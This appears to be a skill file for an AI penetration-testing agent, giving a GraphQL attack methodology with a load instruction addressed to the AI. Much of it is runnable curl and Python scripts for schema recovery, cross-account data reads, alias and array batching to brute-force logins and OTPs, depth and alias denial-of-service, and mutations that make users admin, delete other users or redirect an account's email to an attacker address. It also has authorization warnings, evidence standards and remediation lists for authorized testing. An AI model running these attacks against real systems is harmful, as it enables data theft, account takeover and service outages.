---
name: attack-graphql
description: "GraphQL attack methodology — introspection, field-level authz, batching, depth attacks"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - graphql
  - api
  - authz
  - batching
  - attack
tech_stack:
  - web
  - nodejs
  - python
cwe_ids:
  - CWE-862
  - CWE-770
chains_with:
  - attack-idor-automation
  - attack-rate-limit-bypass
prerequisites: []
severity_boost:
  attack-idor-automation: "GraphQL aliasing plus BOLA = every object in one request"
  attack-rate-limit-bypass: "Batching collapses request-based rate limits entirely"
---

# GraphQL Attack Methodology

> **AI LOAD INSTRUCTION**: GraphQL's security model differs from REST in one decisive way:
> **the route is always the same, and authorization must be applied per resolver.** A gateway
> that authenticates the HTTP request authorizes nothing inside it. Test accordingly — do not
> enumerate endpoints, enumerate **resolvers**.
>
> Three findings are commonly conflated and must be reported separately because they have
> different severities and different fixes: **field-level authorization bypass** (data
> exposure), **batching anti-automation collapse** (credential attack), and **resource
> exhaustion** (availability). A tester who reports all three as "GraphQL is vulnerable"
> produces a report nobody can action.
>
> Also decide early whether introspection is enabled. If it is, you have the schema and the
> work is authorization testing. If it is not, your first job is **schema recovery** — the
> field-suggestion oracle is the highest-yield technique and most testers never try it.

## 0. RELATED ROUTING

- [graphql-exploitation-chains](../graphql-exploitation-chains/SKILL.md) — the long-form companion; load alongside this file
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) — schema recovery and hidden-parameter depth
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — object-level authorization inside arguments
- [attack-rate-limit-bypass](../attack-rate-limit-bypass/SKILL.md) — batching as an anti-automation bypass
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) — endpoint discovery from JS bundles
- [prototype-pollution](../prototype-pollution/SKILL.md) — when input objects reach server-side merging

---

## 1. CONFIRM AND LOCATE THE ENDPOINT

Never assume `/graphql`. Confirm with the one query every GraphQL server answers.

```bash
curl -s -X POST https://TARGET/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
```

A response of `{"data":{"__typename":"Query"}}` confirms GraphQL and tells you the root
operation name. **A `400` with a GraphQL-shaped error also confirms it** — the error format
is distinctive (`{"errors":[{"message":...,"locations":...}]}`).

**Endpoint candidates:**

```text
/graphql  /api/graphql  /v1/graphql  /graphql/v1  /gql  /api/gql
/query    /api/query    /graphql/console  /graphiql  /playground
/internal/graphql  /graphql/private  /api/v2/graphql
```

**Transport variants — each bypasses different middleware:**

| Transport | Test | Why it matters |
|---|---|---|
| `POST` JSON | standard | the middleware that sees this is the hardened one |
| `GET` `?query=` | `curl "https://TARGET/graphql?query={__typename}"` | **often skips CSRF middleware** |
| `application/graphql` | raw body | different parsing path |
| form-encoded | `query=...` | bypasses JSON-only body limits |
| WebSocket | `graphql-ws` protocol | escapes HTTP-layer rate limits entirely |
| array batching | JSON array of operations | see §5 |

**The `GET` variant is the one to test first.** If it works, the endpoint may accept a
cross-site request with no preflight, converting read-only queries into a CSRF-reachable
exfiltration primitive.

---

## 2. SCHEMA ACQUISITION

### 2.1 Introspection when enabled

```graphql
query { __schema { queryType{name} mutationType{name} types{ name kind
  fields{ name args{name type{name kind ofType{name kind ofType{name}}}} } } } }
```

Dump the whole thing and work from it. Pay specific attention to:

- fields on `User`, `Account`, `Organization` types — the data-exposure surface
- mutations that accept an `input` object — mass-assignment surface
- `id`-accepting fields — BOLA surface
- deprecated fields — **often still resolvable and unmaintained**

### 2.2 Schema recovery when introspection is disabled

Introspection disabled is a speed bump, not a control. The **field-suggestion oracle** is the
primary technique:

```graphql
{ user { role } }
# → "Cannot query field \"role\" on type \"User\". Did you mean \"roles\"?"
```

Iterate a wordlist one field per request; the server tells you what exists. A few hundred
probes typically reconstruct the user-facing schema.

**Filter-evasion variants** if `__schema` is explicitly blocked:

```graphql
{ __schema { types { name } } }
query{x:__schema{y:types{z:name}}}
{ __schema @skip(if:false) { types { name } } }
```

**The fastest route is usually the client, not the server.** Mine the JS bundle, source maps,
and mobile app for full query strings — see [api-recon-and-docs](../api-recon-and-docs/SKILL.md) §2.
Persisted-query manifests frequently contain the complete operation set.

---

## 3. FIELD-LEVEL AUTHORIZATION — THE PRIMARY FINDING

The request is authenticated; individual resolvers fail to check the subject's relationship
to the object or field. This is the GraphQL equivalent of BOLA and it is the most common
serious GraphQL bug.

**The read bypass — fields hidden in the UI but present in the schema:**

```graphql
{ user(id:"<victim-id>") { id email phone ssn role permissions mfaEnabled } }
```

**The write bypass — mutations accepting fields the client never sends:**

```graphql
mutation { updateUser(id:"5", input:{ role:"admin" }) { id role } }
mutation { updateProfile(input:{ userId:"1", verified:true, plan:"enterprise" }) { ok } }
```

**Where the gap concentrates:**

| Pattern | Why the check is missing |
|---|---|
| nested object fields | parent resolver checks ownership, child resolver does not |
| aliased duplicates | each alias resolves independently; the check may run once |
| interface / union types | the concrete type's check is easy to omit |
| deprecated fields | marked deprecated but fully resolvable |
| `node(id:)` relay pattern | global ID lookup skips the ownership check |
| mutation return types | the returned object's resolvers are often unchecked |
| list-returning fields | the list filter is applied, individual items are not |

**Test with two accounts, always.** One account reading its own `email` proves nothing. The
finding is account B reading account A's `email` where the UI never offers it. Apply the same
differential discipline as [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md).

---

## 4. ALIASING — THE AMPLIFIER

Aliases let one HTTP request contain many independent operations. Against any per-request
control, this is a force multiplier.

```graphql
{
  a1: user(id:"1"){ email }
  a2: user(id:"2"){ email }
  a3: user(id:"3"){ email }
}
```

**Three distinct consequences:**

| Consequence | Detail |
|---|---|
| rate-limit collapse | N logical reads cost one request |
| authorization-check collapse | if the check runs once per request, the rest ride along |
| enumeration at scale | the entire ID space in one request |

**Against authentication this is an account-takeover primitive:**

```graphql
{
  a1: login(username:"admin", password:"Password1"){ token }
  a2: login(username:"admin", password:"Password2"){ token }
}
```

Combined with a common password list, this defeats request-based lockout and rate limiting
entirely. **The same applies to OTP and password-reset endpoints** — a 6-digit OTP is 10⁶
attempts, which is trivial in batches of 10,000.

**Report this as an anti-automation finding, separate from the authz findings.** The fix is
different (per-operation rate limiting and batch caps), and the severity is driven by whether
lockout was actually bypassed.

---

## 5. ARRAY BATCHING

The transport-level variant, independent of aliasing:

```bash
curl -s -X POST https://TARGET/graphql -H 'Content-Type: application/json' -d '[
  {"query":"mutation{login(u:\"admin\",p:\"1\"){token}}"},
  {"query":"mutation{login(u:\"admin\",p:\"2\"){token}}"}
]'
```

**Test both aliasing and array batching.** They are separate server features and a target
frequently enables the one you did not try. Note which one worked in the report — the
remediation differs.

---

## 6. RESOURCE EXHAUSTION

Unbounded work in a single request. **Report separately from data-exposure findings** — this is
an availability issue, not a confidentiality one.

| Attack | Shape |
|---|---|
| deep nesting | mutually recursive types: `{ user { friends { friends { ... } } } }` |
| wide aliasing | thousands of aliases in one operation |
| large page sizes | `posts(first:999999)` or `limit:100000` |
| cyclic traversal | `user → org → owner → user` |
| directive amplification | repeated `@include(if:true)` on expensive fields |

**Measure the effect rather than assuming it.** Time the request, compare against a baseline
single query, and note the resource consumed. A depth limit gap that causes no measurable
impact is informational, not high.

**Testing discipline:** these attacks can take a production service down. Measure against a
controlled endpoint, stop at the first sign of degradation, and never run a wide-alias flood
against production. An availability finding that requires you to cause an outage is not
proportionate.

---

## 7. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Cross-account data read via field-level authz bypass | **High–Critical (P1/P2)** | two accounts, the leaked field, the differential |
| Privilege escalation via mutation mass assignment | **Critical (P1)** | the mutation, the read-back showing the new role |
| Authentication brute force via aliasing/batching | **High (P2)** | the batch, and lockout demonstrably not triggered |
| Schema exposure via introspection in production | **Low–Medium (P4)** | the introspection response |
| Schema recovery via field suggestions | **Low (P4)** | the suggestion oracle output |
| Resource exhaustion with measured impact | **Medium (P3)** unless service-affecting → **High** | the query and the measured effect |
| GraphQL endpoint accepts cross-site `GET` queries | **Medium (P3)** | a working cross-origin PoC |
| Introspection enabled but nothing sensitive in the schema | **Informational (P5)** | — |

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the endpoint and the transport used (POST/GET/WS/batch) | reproducibility; these differ per path |
| the full operation including operation name and variables | the operation is the payload |
| the response with both `data` and `errors` | errors carry schema leakage |
| for authz findings: two accounts and the differential | proves it is a bypass, not intended access |
| for batching: the request and the count of operations executed | proves the control gap |
| for exhaustion: the query, its cost, and the measured effect | separates real impact from theory |
| the schema dump or suggestion output | proves discovery method |
| a **negative control** query that behaves normally | proves the anomaly is the finding |

**Quote error messages verbatim** for schema-recovery findings — the server naming a field is
stronger proof than any inference.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| introspection enabled, schema contains only public data | not a finding |
| an alias batch returns `401` on all entries | batching works, authz holds |
| a deep query returns `500` with no measurable impact | a bug, not a resource-exhaustion finding |
| the field you "leaked" was your own | no differential |
| `__typename` answered but the endpoint requires auth for real queries | limited surface |
| the rate limit applied per operation, not per request | control is working |

---

## 9. REMEDIATION REFERENCE

1. **Authorize in every resolver** — the gateway authenticates, it does not authorize. Each resolver returning sensitive data or accepting a mutation must verify the subject's relationship to the object.
2. **Use a per-field policy layer** — a directive or schema-visitor that applies an authorization rule to every field by default, so a newly added field is protected without a manual step.
3. **Disable introspection in production** — defence in depth only, never the primary control. Pair it with proper resolver authorization.
4. **Disable field suggestions and stack traces** — the suggestion oracle reconstructs the schema; a generic error with a correlation ID closes it.
5. **Cap query depth, complexity, and alias count** — enforce a computed cost budget before execution. Depth limits alone do not stop wide aliasing, and vice versa; you need both.
6. **Rate-limit by operation, not by HTTP request** — count logical operations after parsing, with dedicated strict limits on authentication, OTP, and password-reset mutations.
7. **Disable or cap array batching** — turn it off if the client does not need it; otherwise cap batch size and charge every entry against the rate limit.
8. **Apply CSRF protection to the GraphQL endpoint** — including the `GET` path and non-JSON content types. Do not exempt it because it is "an API."
9. **Use persisted queries as an allowlist in production** — accepting only registered operation IDs eliminates arbitrary query shape, hidden fields, and unbounded complexity in one control.

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the query **return data for an object you do not own**? | the authorization defect, not the schema |
| 2 | Was there a **control** - the same query for an object you do own, or an unauthenticated attempt? | the check exists and you bypassed it |
| 3 | Did **introspection** reveal the field, or did you find it another way? | introspection is an enabler, not the finding |
| 4 | Did you reach **mutations**, or only queries? | write access is a different severity |
| 5 | Is **depth or complexity limited**, or did a nested query reach a dangerous resolver? | the DoS or the chain |
| 6 | Did a field resolver perform an **SSRF, a file read, or a database call** with your input? | the escalation |
| 7 | Did you **not modify any object** you did not own? | engagement integrity |

**Data for an object you do not own is the bar.** An enabled introspection endpoint is a configuration
note; the cross-tenant read is the finding.

---

## 11. EXECUTION PRIMITIVES

GraphQL findings are proven by **a query returning unauthorised data, with the introspection result as
context and an ownership or authentication control**. Every block ends at data.

### 11.1 The endpoint, the schema, and the control

```bash
T="https://target.example/graphql"
# the endpoint and its enabled features
curl -sS -X POST "$T" -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}' -o /tmp/g1.json -w 'typename %{http_code}\n'; head -c 200 /tmp/g1.json; echo
# THE CONTROL: introspection disabled is the secure case - record which it is
curl -sS -X POST "$T" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}' | head -c 300; echo
echo "  ^ if this returns the schema, introspection is ENABLED (an enabler, not a finding by itself)"
# the full introspection dump, saved for the report
curl -sS -X POST "$T" -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery {__schema {queryType{name} mutationType{name} types {kind name fields {name args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind}}}}}}}"}' \
  -o /tmp/gql_schema.json
python3 -c "
import json
d=json.load(open('/tmp/gql_schema.json'))
t=d.get('data',{}).get('__schema',{}).get('types',[])
print('types:', len(t))
for x in t:
    if x.get('name','').startswith('__'): continue
    f=[y['name'] for y in (x.get('fields') or [])][:8]
    if f: print(' ', x['name'], '->', ', '.join(f))
" 2>/dev/null | head -40
# and the HTTP-status clue: a GraphQL endpoint answers 200 with errors for a POST to /graphql
curl -sS -o /dev/null -w 'GET %{http_code}  POST %{http_code}\n' "$T"
```

**Introspection enabled is context, not the finding.** It shortens the work enormously, and the report
should say whether it was enabled and then focus on what it revealed.

### 11.2 The extraction: batching, aliases, and the IDOR

```python
# the three extraction primitives. Each one multiplies a single query into many objects.
import requests, json
T = "https://target.example/graphql"
H = {"Content-Type": "application/json", "Authorization": "Bearer USER_TOKEN"}

def q(query, variables=None):
    r = requests.post(T, json={"query": query, "variables": variables or {}}, headers=H, timeout=20)
    return r.status_code, r.text[:600]

# 1) ALIAS BATCHING: many objects in one request, which defeats a per-request rate limit
aliases = " ".join(f'a{i}: user(id:"{i}"){{ id email role }}' for i in range(1, 21))
print("=== ALIAS BATCHING ===")
print(q("{" + aliases + "}")[1][:500])
print()
# 2) THE IDOR: an object id you do not own, with the OWN object as the control
print("=== IDOR (own id = control, other id = the test) ===")
for oid in ["1001", "1002", "1", "2"]:
    qy = f'{{ user(id:"{oid}"){{ id email role }} }}'
    st, body = q(qy)
    print(f"  id={oid:6} {st} {body[:140]}".replace("\n", " "))
print()
# 3) NESTED TRAVERSAL: follow an edge from an object you CAN see to one you cannot
print("=== NESTED TRAVERSAL ===")
for qy in ['{ me { team { members { id email role } } } }',
           '{ me { organization { users { id email } } } }',
           '{ node(id:"T3Jnab25hbA==") { ... on User { email } } }']:
    print("  ", q(qy)[1][:180].replace("\n", " "))
```

**The alias batch and the own-object control in one output.** Batching shows the scale; the control shows
the authorization is actually being bypassed rather than absent.

### 11.3 Mutations, and the write path

```python
# a query leak is a read; a PERMITTED mutation on another user's object is a different severity
import requests
T = "https://target.example/graphql"; H = {"Content-Type": "application/json", "Authorization": "Bearer USER_TOKEN"}
MUTATIONS = {
 "change-email":  'mutation { updateUser(id:"1002", input:{email:"attacker@evil.example"}) { user { id email } } }',
 "make-admin":    'mutation { updateRole(id:"1001", role:ADMIN) { user { id role } } }',
 "delete-other":  'mutation { deleteUser(id:"1002") { success } }',
 "add-to-team":   'mutation { addTeamMember(teamId:"T2", userId:"1001") { ok } }',
}
print("RUN THE CONTROL FIRST: the same mutation against YOUR OWN id, which must succeed.")
print()
for name, m in MUTATIONS.items():
    print(f"{name:14} {m[:100]}")
print()
print("DO NOT RUN the destructive ones without written authorization. For the report, an update")
print("that SUCCEEDED on an object you do not own is the finding - verify with a READ afterwards,")
print("then reverse it and record the reversal.")
print()
print("THE CONTROL for each: the same mutation against your own object succeeding, plus a")
print("verification read that shows the change. A rejected mutation is the control working.")
```

**A permitted mutation on another object, verified by a read, then reversed.** Reads are usually
reportable immediately; writes need authorisation and a reversal.

### 11.4 Depth, complexity, and the resolver-level chains

```bash
T="https://target.example/graphql"
# 1) DEPTH: does a nested query get rejected, or does it exhaust the resolver stack
Q=$(python3 -c "print('{ me ' + '{ friends ' * 30 + '{ id } ' + '} ' * 30 + '}')")
curl -sS -X POST "$T" -H 'Content-Type: application/json' -d "{\"query\":\"$Q\"}" -o /tmp/depth.json -w 'depth30 %{http_code} %{size_download}B %{time_total}s\n'
head -c 200 /tmp/depth.json; echo
# 2) COMPLEXITY: a batched alias query of a heavy field, which is the classic DoS shape
Q2=$(python3 -c "print('{' + ' '.join(f'a{i}: search(q:\"x\"){{ id name }}' for i in range(500)) + '}')")
curl -sS -X POST "$T" -H 'Content-Type: application/json' --data-binary "{\"query\":$Q2}" -o /dev/null -w 'aliases500 %{http_code} %{time_total}s\n' 2>/dev/null
# explain-style check where supported
curl -sS -X POST "$T" -H 'Content-Type: application/json' -d '{"query":"{__type(name:\"User\"){fields{name}}}"}' | head -c 200; echo
# 3) RESOLVER CHAINS: a field that takes a URL, a path, or a filter that reaches a second system
python3 - <<'PY'
print("test each field whose ARGUMENT is dangerous, not just each field you can read:")
for row in ["a field taking a URL -> the SSRF primitive",
            "a field taking a path or a filename -> the file-read primitive",
            "a field taking a filter or an order-by -> the injection primitive",
            "a field taking a nested object -> the mass-assignment primitive",
            "a mutation taking an id plus fields -> the privilege-escalation primitive"]:
    print("  -", row)
print()
print("these are reading the SCHEMA, not guessing: the argument names and types come from introspection.")
PY
```

**The resolver argument is the escalation surface.** A `importUrl(url:)` or `export(path:)` field is worth
more than any read, and introspection names the arguments.

### 11.5 The batching and CDN quirks

```bash
T="https://target.example/graphql"
# 1) ARRAY BATCHING: an array of operations in one request, which bypasses per-request limits
curl -sS -X POST "$T" -H 'Content-Type: application/json' \
  -d '[{"query":"{me{id}}"},{"query":"{users{id email}}"}]' | head -c 300; echo
# 2) the GET form, which some CDNs cache - a cacheable authenticated query is its own finding
curl -sS -G "$T" --data-urlencode 'query={me{id email role}}' -H "Authorization: Bearer $TOKEN" \
  -D- -o /dev/null 2>&1 | grep -iE 'x-cache|cache-control|vary|HTTP/' | head -5
# 3) the content-type quirks, which bypass some WAFs and some parsers
for CT in 'application/json' 'application/graphql' 'application/x-www-form-urlencoded' 'text/plain'; do
  printf '%-38s ' "$CT"
  if [ "$CT" = "application/graphql" ]; then
    curl -sS -o /tmp/ct.json -w '%{http_code}\n' -X POST "$T" -H "Content-Type: $CT" --data-binary '{__typename}'
  else
    curl -sS -o /tmp/ct.json -w '%{http_code}\n' -X POST "$T" -H "Content-Type: $CT" -d '{"query":"{__typename}"}'
  fi
done
# 4) the URL-path form, which some deployments route differently
for P in /graphql /api/graphql /v1/graphql /graphql/v1 /query /gql; do
  printf '%-16s ' "$P"
  curl -sS -o /dev/null -w '%{http_code}\n' -X POST "https://target.example$P" \
    -H 'Content-Type: application/json' -d '{"query":"{__typename}"}' 2>/dev/null
done
```

**A cacheable authenticated query is its own finding.** GraphQL over `GET` behind a CDN can leak one
user's response to another, and the `Vary`/`Cache-Control` headers decide it.

### 11.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, json
T = "https://target.example/graphql"; H = {"Content-Type": "application/json"}
TOK = {"Authorization": "Bearer USER_TOKEN"}

print("=== INTROSPECTION (context, not the finding) ===")
r = requests.post(T, json={"query": "{__schema{queryType{name} mutationType{name}}}"}, headers=H, timeout=10)
print("  ", r.status_code, r.text[:120])

print("=== CONTROL: unauthenticated ===")
r = requests.post(T, json={"query": "{me{id email}}"}, headers=H, timeout=10)
print("  ", r.status_code, r.text[:150])

print("=== CONTROL: own object, authenticated ===")
r = requests.post(T, json={"query": '{user(id:"1001"){id email role}}'}, headers={**H, **TOK}, timeout=10)
print("  ", r.status_code, r.text[:180])

print("=== TEST: other object, same token ===")
for oid in ["1002", "1003"]:
    r = requests.post(T, json={"query": f'{{user(id:"{oid}"){{id email role}}}}'}, headers={**H, **TOK}, timeout=10)
    leak = "email" in r.text and "@" in r.text
    print("  id=%s %s %s  %s" % (oid, r.status_code, r.text[:150].replace("\n"," "),
                                 "<-- UNAUTHORISED READ" if leak else ""))

print("=== BATCHING ===")
al = " ".join(f'a{i}: user(id:"{i}"){{id email}}' for i in range(1, 11))
r = requests.post(T, json={"query": "{" + al + "}"}, headers={**H, **TOK}, timeout=20)
print("  ", r.status_code, "objects returned:", r.text.count("@"))
print()
print("FINDING = the other-object row returning data while the unauthenticated control is rejected")
print("          and the own-object control succeeds. Introspection is context.")
PY
```

**Three controls and the test row.** The own-object control is what proves the authorization check exists
and is being bypassed rather than simply missing.

---

## 12. EVIDENCE STANDARD — GRAPHQL ARTEFACTS

| Item | Why |
|---|---|
| The **introspection result**, or its rejection | context for every other finding |
| The **unauthenticated control** | proves authentication is required for some operations |
| The **own-object control** | proves a per-object check exists |
| The **query returning another object's data**, verbatim | the finding |
| The **response body** with the leaked fields | the impact |
| Any **mutation executed**, its verification read, and its reversal | the write severity and the cleanup |
| The **batching or alias form**, with the object count | the scale |
| Any **resolver-level chain** (a URL argument, a path, a filter) | the escalation |
| Whether `GET` is enabled and the **cache headers** | a separate cache-leak finding |
| Confirmation that **no object was left modified** | engagement integrity |

Report the **leak and the controls**: "the endpoint returns `{"data":{"__typename":"Query"}}` and
introspection is enabled, returning 143 types including a `User` type with `email`, `role`, and
`internalNotes` fields. An unauthenticated `{me{id email}}` returns a `Not Authorized` error, which is the
authentication control, and `{user(id:"1001"){id email role}}` with my own token returns my own record,
which is the ownership control. The same query with `id:"1002"` returns another user's email, `role`, and
`internalNotes`, which is the finding, and an alias batch `{a1:user(id:"1"){email} ... a20:user(id:"20")
{email}}` returned 20 records in a single 200 response, which shows there is no per-object or
per-request limit. Introspection named an `importUrl(url:)` mutation whose authorisation is the same
`user` role, which is reported separately", never "GraphQL introspection is enabled".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| **Introspection enabled**, with nothing else | an enabler; a configuration note, not a finding |
| A schema or field **name** discovered | information, not authorisation |
| A query returning **your own** object | the baseline |
| An **unauthenticated** query that is rejected | the control working |
| A `200` with a GraphQL **`errors` array** and no `data` | the request failed; read the errors |
| A field you can see but that returns `null` for another object | the authorization is enforced, or the object does not exist |
| A **suggested field name** in an error message | a typo suggestion, not introspection |
| A **depth limit** that rejected your query | the control working |
| A **mutation you did not execute** because you lacked authorisation | an untested path; say so |
| A resolver taking a URL **with a strict allowlist you did not bypass** | the control working |
| A finding on the **vendor's public demo endpoint** | not the target |

**An other-object read with the unauthenticated and own-object controls.** Introspection and field names
are the most-reported non-findings in this family, and the ownership control is the remedy.

---

## 13. REMEDIATION REFERENCE — RESOLVER AUTHORIZATION HARDENING

1. **Authorize at the resolver or the data layer for every field and every object, not at the HTTP layer alone** - a single GraphQL endpoint means the transport cannot distinguish one field from another.
2. **Disable introspection in production, or restrict it to authenticated administrators** - it is not a control by itself, but it removes the discovery step and is cheap.
3. **Enforce a maximum query depth, a maximum complexity score, and a maximum alias count per request** - the alias-batching and depth families are both addressed by this.
4. **Disable or restrict array batching in the transport, and apply the same rate limit per operation rather than per request** - per-request limits do not survive a batched operation.
5. **Return the same error shape for "not found" and "not authorized", so the API does not disclose the existence of objects** - it removes the enumeration signal.
6. **Validate resolver arguments against an allowlist, especially any argument that becomes a URL, a filesystem path, or a query fragment** - the resolver-level chains arrive through exactly those arguments.
7. **Reject GraphQL over `GET` for anything authenticated, or set `Cache-Control: private` and `Vary` on every response** - it removes the cache-leak path.
8. **Apply field-level authorization by default, and treat a newly added field as unauthorized until someone grants it** - the common regression is a new field with no check.
9. **Log every operation with its name, depth, alias count, and the authenticated principal, and alert on deep queries and on a high alias count** - both are the attack's signature.
10. **Disable the suggestion feature and the field-explanation output in production** - they leak the schema where introspection is disabled.
11. **Test the schema with an unauthorized-token sweep on every release: for each field, does a low-privilege token receive another object's data?** - it is mechanical and it finds the regressions.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) - the full technique reference
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the object-level authorization defect this is an instance of
- [graphql-exploitation-chains](../graphql-exploitation-chains/SKILL.md) - the escalation chains from a resolver
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - the discovery discipline this shares
- [attack-idor-automation](../attack-idor-automation/SKILL.md) - the automation approach to the same object-id sweep
